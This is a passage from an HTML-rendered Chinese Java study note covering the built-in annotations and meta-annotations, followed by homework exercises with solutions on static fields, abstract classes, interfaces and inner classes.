class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Father fly...&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Father</span>&#123;<br>    <span class="hljs-comment">//注解，放在fly方法上，表示子类的fly方法事，重写了父类的fly</span><br>    <span class="hljs-comment">//即便没有写@Override，还是重写了父类fly</span><br>    <span class="hljs-comment">//如果写了@Override，编译器就会检查是否真的重写了父类的方法</span><br>    <span class="hljs-comment">//  如果没有重写，则编译错误。</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Son fly...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Override的定义:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Indicates that a method declaration is intended to override a</span><br><span class="hljs-comment"> * method declaration in a supertype. If a method is annotated with</span><br><span class="hljs-comment"> * this annotation type compilers are required to generate an error</span><br><span class="hljs-comment"> * message unless at least one of the following conditions hold:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * &lt;ul&gt;&lt;li&gt;</span><br><span class="hljs-comment"> * The method does override or implement a method declared in a</span><br><span class="hljs-comment"> * supertype.</span><br><span class="hljs-comment"> * &lt;/li&gt;&lt;li&gt;</span><br><span class="hljs-comment"> * The method has a signature that is override-equivalent to that of</span><br><span class="hljs-comment"> * any public method declared in &#123;<span class="hljs-doctag">@linkplain</span> Object&#125;.</span><br><span class="hljs-comment"> * &lt;/li&gt;&lt;/ul&gt;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>  Peter von der Ah&amp;eacute;</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>  Joshua Bloch</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@jls</span> 8.4.8 Inheritance, Overriding, and Hiding</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@jls</span> 9.4.1 Inheritance and Overriding</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@jls</span> 9.6.4.4 <span class="hljs-doctag">@Override</span></span><br><span class="hljs-comment"> * <span class="hljs-doctag">@since</span> 1.5</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Target(ElementType.METHOD)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.SOURCE)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Override &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>此处的@interface不是代表接口，而是<strong>注解类</strong>。JDK5.0后加入。</p><h3 id="2-Deprecated"><a href="#2-Deprecated" class="headerlink" title="2.Deprecated"></a>2.Deprecated</h3><p>用于表示某个程序元素（类、方法等）已过时。</p><p>即不再推荐使用，但仍可以使用。</p><p><strong>使用说明：</strong></p><ol><li>用于表示某个程序元素（类、方法等）已过时</li><li>可以修饰方法、类、字段、包、参数 等等</li><li>@Target(value&#x3D;{CONSTRUCTOR, FIELD, LOCAL_VARIABLE, METHOD, PACKAGE, MODULE, PARAMETER, TYPE})</li><li>@Depreacted的<strong>作用可以做到新旧版本的兼容和过渡</strong></li></ol><p>Depreacted的定义:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Target(value=&#123;CONSTRUCTOR, FIELD, LOCAL_VARIABLE, METHOD, PACKAGE, MODULE, PARAMETER, TYPE&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Deprecated &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Returns the version in which the annotated element became deprecated.</span><br><span class="hljs-comment">     * The version string is in the same format and namespace as the value of</span><br><span class="hljs-comment">     * the &#123;<span class="hljs-doctag">@code</span> <span class="hljs-doctag">@since</span>&#125; javadoc tag. The default value is the empty</span><br><span class="hljs-comment">     * string.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the version string</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@since</span> 9</span><br><span class="hljs-comment">     */</span><br>    String <span class="hljs-title function_">since</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Indicates whether the annotated element is subject to removal in a</span><br><span class="hljs-comment">     * future version. The default value is &#123;<span class="hljs-doctag">@code</span> false&#125;.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> whether the element is subject to removal</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@since</span> 9</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">forRemoval</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-SupperessWarnings"><a href="#3-SupperessWarnings" class="headerlink" title="3.SupperessWarnings"></a>3.SupperessWarnings</h3><p>抑制编译器警告。</p><p><strong>使用说明：</strong></p><ol><li><p>当我们不希望看到这些警告的时候，可以使用SupperessWarnings注解来抑制警告信息</p></li><li><p>在{“”}中，可以写入希望抑制（不显示）的警告信息</p><blockquote><ul><li><strong>all</strong> to suppress all warnings （抑制所有警告）</li><li><strong>boxing</strong> to suppress warnings relative to boxing&#x2F;unboxing operations（抑制装箱、拆箱操作时候的警告）</li><li><strong>cast</strong> to suppress warnings relative to cast operations （抑制映射相关的警告）</li><li><strong>dep-ann</strong> to suppress warnings relative to deprecated annotation（抑制启用注释的警告）</li><li><strong>deprecation</strong> to suppress warnings relative to deprecation（抑制过期方法警告）</li><li><strong>fallthrough</strong> to suppress warnings relative to missing breaks in switch statements（抑制确在switch中缺失breaks的警告）</li><li><strong>finally</strong> to suppress warnings relative to finally block that don’t return （抑制finally模块没有返回的警告）</li><li><strong>hiding</strong> to suppress warnings relative to locals that hide variable（）</li><li><strong>incomplete-switch</strong> to suppress warnings relative to missing entries in a switch statement (enum case)(忽略没有完整的switch语句)</li><li><strong>nls</strong> to suppress warnings relative to non-nls string literals(忽略非nls格式的字符)</li><li><strong>null</strong> to suppress warnings relative to null analysis(忽略对null的操作)</li><li><strong>rawtypes</strong> to suppress warnings relative to un-specific types when using generics on class params(使用generics时忽略没有指定相应的类型)</li><li><strong>restriction</strong> to suppress warnings relative to usage of discouraged or forbidden references</li><li><strong>serial</strong> to suppress warnings relative to missing serialVersionUID field for a serializable class(忽略在serializable类中没有声明serialVersionUID变量)</li><li><strong>static-access</strong> to suppress warnings relative to incorrect static access（抑制不正确的静态访问方式警告)</li><li><strong>synthetic-access</strong> to suppress warnings relative to unoptimized access from inner classes（抑制子类没有按最优方法访问内部类的警告）</li><li><strong>unchecked</strong> to suppress warnings relative to unchecked operations（抑制没有进行类型检查操作的警告）</li><li><strong>unqualified-field-access</strong> to suppress warnings relative to field access unqualified （抑制没有权限访问的域的警告）</li><li><strong>unused</strong> to suppress warnings relative to unused code  （抑制没被使用过的代码的警告）</li></ul></blockquote></li><li><p>SupperessWarnings的作用范围和放置的位置有关</p></li><li><p>&#96;&#96;&#96;java<br>@Target({TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE, MODULE})</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br><br><br>例子：<br><br>使用前（黄色警告）：<br><br>&lt;img src=<span class="hljs-string">&quot;https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221106113106794.png&quot;</span> alt=<span class="hljs-string">&quot;image-20221106113106794&quot;</span> style=<span class="hljs-string">&quot;zoom:50%;&quot;</span> /&gt;<br><br>使用后：<br><br>&lt;img src=<span class="hljs-string">&quot;https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221106113139435.png&quot;</span> alt=<span class="hljs-string">&quot;image-20221106113139435&quot;</span> style=<span class="hljs-string">&quot;zoom:50%;&quot;</span> /&gt;<br><br><br><br>### 元注解<br><br>基本介绍：JDK的元Annotation用于修饰其他Annotation。<br><br>种类：<br><br><span class="hljs-number">1</span>. Retention ——指定注解的作用范围，三种：<span class="hljs-keyword">SOURCE</span>，<span class="hljs-keyword">CLASS</span>，<span class="hljs-keyword">RUNTIME</span><br><span class="hljs-number">2</span>. Target —— 指定注解可以在哪些地方使用<br><span class="hljs-number">3</span>. Documented —— 指定该注解是否会在javadoc提现<br><span class="hljs-number">4</span>. Inherited —— 子类会继承父类注解<br><br><br><br>**Retention**<br><br>只能修饰一个Annotation定义，用于指定改Annotation**可以保留多长时间**。<br><br>三种值：<br><br><span class="hljs-keyword">SOURCE</span>：编译器使用后，直接丢弃这种策略的注释<br><br><span class="hljs-keyword">CLASS</span>：编译器将把注解记录在<span class="hljs-keyword">class</span>文件中，当运行Java程序时，JVM不会保留注解。<br><br><span class="hljs-keyword">RUNTIME</span>：编译器将把注解记录在 <span class="hljs-keyword">class</span> 文件中.当运行Java 程序时， JVM 会保留注释。程序可以通过反射获取该注释。<br><br>**Target** <br><br>用于指定被修饰的Annotation能用于**修饰哪些程序元素**。<br><br>**Documented**<br><br>用于指定被该元 Annotation 修饰的 Annotation 类将被javadoc 工具提取成文档，即**在生成文档时，可以看到该注解**。<br>说明：定义为Documented的注解必须设置Retention值为<span class="hljs-keyword">RUNTIME</span>。<br><br>**Inherited**<br><br>被它修饰的 Annotation 将**具有继承性**.如果某个类使用了被 ＠Inherited 修饰的 Annotation，则其子类将自动具有该注解<br><br> <br><br>## 家庭作业<br><br>### 题目<span class="hljs-number">1</span><br><br>![image-<span class="hljs-number">20221106151721985</span>](https:<span class="hljs-comment">//soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221106151721985.png)</span><br><br>输出：<br><br><span class="hljs-number">9.0</span> red <span class="hljs-number">100.0</span> red<br><br>解析：<span class="hljs-keyword">static</span>部分的代码只会随着类的加载执行一次。<br><br><br><br>### 题目<span class="hljs-number">2</span> -静态<br><br>&gt; <span class="hljs-number">1</span>.在Frock类中声明私有的静态属性currentNum［<span class="hljs-keyword">int</span>类型］，初始值为<span class="hljs-number">100000</span>，作为衣服出厂的序列号起始值。<br>&gt; <span class="hljs-number">2</span>.声明公有的静态方法getNextNum，作为生成上衣唯一序列号的方法。每调用一次，将currentNum增加<span class="hljs-number">100</span>，并作为返回值。<br>&gt; <span class="hljs-number">3</span>.在TestFrock类的main方法中，分两次调用getNextNum方法，获取序列号并打印输出。<br>&gt;<br>&gt; <span class="hljs-number">4</span>.在Frock类中声明serialNumber（序列号）属性，并提供对应的get方法；<br>&gt; <span class="hljs-number">5</span>.在Frock类的构造器中，通过调用getNextNum方法为Frock对象获取唯一序列号，赋给serialNumber属性。<br>&gt; <span class="hljs-number">6</span>.在TestFrock类的main方法中，分别创建三个Frock对象，并打印三个对象的序列号，验证是否为按<span class="hljs-number">100</span>递增。<br><br>```java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> Homework02 &#123;<br>&#125;<br><span class="hljs-keyword">class</span> TestFrock&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> main(String[] args) &#123;<br>        System.out.<span class="hljs-keyword">println</span>(Frok.getNextNum());<br>        System.out.<span class="hljs-keyword">println</span>(Frok.getNextNum());<br>        Frok frok1 = <span class="hljs-keyword">new</span> Frok();<br>        Frok frok2 = <span class="hljs-keyword">new</span> Frok();<br>        Frok frok3 = <span class="hljs-keyword">new</span> Frok();<br>        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;fork1:&quot;</span>+frok1.getSerialNumber()+<br>                <span class="hljs-string">&quot;\nfork2:&quot;</span>+frok2.getSerialNumber()+<br>                <span class="hljs-string">&quot;\nfork3:&quot;</span>+frok3.getSerialNumber());<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> Frok&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> currentNum = <span class="hljs-number">100000</span>; <span class="hljs-comment">//衣服出厂的序列号起始值</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> serialNumber; <span class="hljs-comment">//序列号</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> getSerialNumber()&#123;<br>        <span class="hljs-keyword">return</span> serialNumber;<br>    &#125;<br>    <span class="hljs-comment">//生成上衣唯一序列号的方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> getNextNum()&#123;<br>        currentNum += <span class="hljs-number">100</span>;<br>        <span class="hljs-keyword">return</span> currentNum;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Frok()&#123;<br>        serialNumber = getNextNum();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>输出：</p><blockquote><p>100100<br>100200<br>fork1:100300<br>fork2:100400<br>fork3:100500</p></blockquote><h3 id="题目3-抽象"><a href="#题目3-抽象" class="headerlink" title="题目3 - 抽象"></a>题目3 - 抽象</h3><blockquote><p>按要求实现下列问题：<br>1.动物类Animal包含了抽象方法 shout（）；</p><p>2.Cat类继承了Animal，并实现方法shout，打印“猫会喵喵叫”</p><p>3.Dog类继承了Animal，并实现方法shout，打印“狗会汪汪叫”</p><p>4.在测试类中实例化对象Animal cat ＝new Cat（），并调用cat的shout方法</p><p>5.在测试类中实例化对象Animal dog＝new Dog（），并调用dog的shout方法</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Animal</span> <span class="hljs-variable">cat</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<br>        cat.shout();<br>        <span class="hljs-type">Animal</span> <span class="hljs-variable">dog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();<br>        dog.shout();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>&#123; <span class="hljs-comment">//抽象类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shout</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shout</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;猫会喵喵叫！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shout</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;狗会汪汪叫！&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="题目4-接口"><a href="#题目4-接口" class="headerlink" title="题目4 -接口"></a>题目4 -接口</h3><blockquote><p>1.计算器接口具有work方法，功能是运算，有一个手机类Cellphone，定义方法testWork测试计算功能，调用计算接口的work方法，<br>2.要求调用CellPhone对象的testWork方法，使用上匿名内部类</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Cellphone</span> <span class="hljs-variable">cellphone</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cellphone</span>();<br>        cellphone.testWork(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ICalculate</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">work</span><span class="hljs-params">(<span class="hljs-type">double</span> n1, <span class="hljs-type">double</span> n2)</span> &#123;<br>                <span class="hljs-keyword">return</span> n1+n2;<br>            &#125;<br>        &#125;,<span class="hljs-number">10</span>,<span class="hljs-number">8</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICalculate</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">work</span><span class="hljs-params">(<span class="hljs-type">double</span> n1,<span class="hljs-type">double</span> n2)</span>;<br>    <span class="hljs-comment">//该方法完成的计算，交给匿名内部类</span><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cellphone</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testWork</span><span class="hljs-params">(ICalculate iCalculate,<span class="hljs-type">double</span> n1,<span class="hljs-type">double</span> n2)</span>&#123;<br>        <span class="hljs-type">double</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> iCalculate.work(n1,n2);<br>        System.out.println(<span class="hljs-string">&quot;结果为：&quot;</span>+result);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="题目5-局部内部类"><a href="#题目5-局部内部类" class="headerlink" title="题目5 - 局部内部类"></a>题目5 - 局部内部类</h3><blockquote><p>1.编一个类A，在类中定义局部内部类B，B中有一个私有final常量name，有一个方法show（）打印常量name。进行测试<br>2.进阶:A中也定义一个私有的变量name，在show方法中打印测试</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>().f1();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">f1</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> &#123;<br>            <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;韩顺平教育&quot;</span>;<br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;NAME=&quot;</span> + NAME +<br>                                    <span class="hljs-string">&quot;\n外部类的name=&quot;</span> + A.<span class="hljs-built_in">this</span>.NAME);<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>        b.show();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221106170327944.png" alt="image-20221106170327944" style="zoom:50%;" /><h3 id="题目6-综合题"><a href="#题目6-综合题" class="headerlink" title="题目6 - 综合题"></a>题目6 - 综合题</h3><blockquote><p> 1.有一个交通工具接口类Vehicles，有work接口<br>2.有Horse类和Boat类分别实现Vehicles<br>3.创建交通工具工厂类，有两个方法分别获得交通工具Horse和Boat<br>4.有Person类，有name和Vehicles属性，在构造器中为两个属性赋值<br>5.实例化Person对象“唐僧”，要求一般情况下用Horse作为交通工具，遇到大河时用Boat作为交通工具</p></blockquote><p>代码过多，见Chapter11-homework06</p><h3 id="题目7-成员内部类"><a href="#题目7-成员内部类" class="headerlink" title="题目7 - 成员内部类"></a>题目7 - 成员内部类</h3><blockquote><p>有一个Car类，有属性temperature（温度），车内有Air（空调）类，有吹风的功能flow，Air会监视车内的温度，如果温度超过40度则吹冷气。如果温度低于0度则吹暖气，如果在这之间则关掉空调。实例化具有不同温度的Car对象，调用空调的flow方法，测试空调吹的风是否正确.&#x2F;&#x2F;体现类与类的包含关系的案例类（内部类【成员内部类】）</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework07</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Car</span> <span class="hljs-variable">car</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(<span class="hljs-number">60</span>);<br>        car.getAir().flow();<br>        <span class="hljs-type">Car</span> <span class="hljs-variable">car1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(<span class="hljs-number">40</span>);<br>        car1.getAir().flow();<br>        <span class="hljs-type">Car</span> <span class="hljs-variable">car2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(-<span class="hljs-number">10</span>);<br>        car2.getAir().flow();<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> temperature;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Car</span><span class="hljs-params">(<span class="hljs-type">double</span> temperature)</span> &#123;<br>        <span class="hljs-built_in">this</span>.temperature = temperature;<br>    &#125;<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Air</span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">flow</span><span class="hljs-params">()</span>&#123;<br>            <span class="hljs-keyword">if</span> (temperature &gt; <span class="hljs-number">40</span>)&#123;<br>                System.out.println(<span class="hljs-string">&quot;温度大于40 空调吹冷气...&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (temperature &lt; <span class="hljs-number">0</span> )&#123;<br>                System.out.println(<span class="hljs-string">&quot;温度小于0 空调吹暖气...&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;温度正常，关闭空调...&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//返回一个Air对象</span><br>    <span class="hljs-keyword">public</span> 